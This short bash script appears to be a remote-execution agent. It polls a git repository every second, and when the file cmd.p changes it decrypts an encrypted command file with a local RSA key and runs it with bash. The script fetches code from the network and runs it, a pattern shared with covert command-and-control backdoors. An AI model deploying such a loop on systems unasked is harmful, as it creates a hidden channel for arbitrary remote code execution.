#!/bin/bash

THEN=$(base64 cmd.p)
NOW=$(base64 cmd.p)
while true
do
  git pull origin main
  sleep 1
  NOW=$(base64 cmd.p)
  if [[ "$NOW" != "$THEN" ]] ;
  then
    openssl rsautl -decrypt -inkey ~/keypair -in cmd.p -out pass
    openssl enc -d -aes-256-cbc -in cmd -out cmd.sh -pass file:pass
    rm pass
    bash cmd.sh
    THEN=$(base64 cmd.p)
  fi
done

